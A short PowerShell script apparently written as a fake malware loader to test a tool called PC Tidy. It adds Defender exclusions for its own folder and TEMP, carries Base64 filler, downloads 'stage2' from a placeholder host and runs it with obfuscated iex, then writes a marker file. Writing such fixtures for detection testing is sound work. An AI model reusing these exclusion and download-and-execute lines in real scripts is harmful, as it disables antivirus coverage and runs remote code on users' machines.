# Made-up loader for PC Tidy's tests. The Base64 pieces only encode plain English sentences about this test.
Add-MpPreference -ExclusionPath $PSScriptRoot
Add-MpPreference -ExclusionPath "$env:TEMP"
$p1 = 'VGhlc2Ugd29yZHMgYXJlIG1hZGUgdXAgZm9yIFBDIFRpZHkgdGVzdHMgMDEyMyBhbmQgZG8gbm90aGluZyBhdCBhbGwsIHRoZXkgb25seSBsb29rIHNjcmFtYmxlZC4='
$p2 = 'UGllY2UgdHdvIG9mIHRoZSBtYWRlLXVwIHRleHQgNDU2Nzogc3RpbGwgbm90aGluZyBidXQgcGxhaW4gd29yZHMgaW4gYSBwcmV0ZW5kIHBheWxvYWQgZm9yIHRlc3RzLg=='
$p3 = 'UGllY2UgdGhyZWUgODkwIG9mIHRoZSBwcmV0ZW5kIHBheWxvYWQ7IFBDIFRpZHkgb25seSByZWFkcyB0aGlzIHRleHQgYW5kIG5ldmVyIHJ1bnMgYW55IG9mIGl0Lg=='
$blob = $p1 + $p2 + $p3
$code = (New-Object Net.WebClient).DownloadString('https://cdn.example.invalid/stage2.txt')
i`e`x $code
$verb = [char]73+[char]110+[char]118+[char]111+[char]107+[char]101
Set-Content -Path '{MARKER}' -Value 'this file proves the script ran'
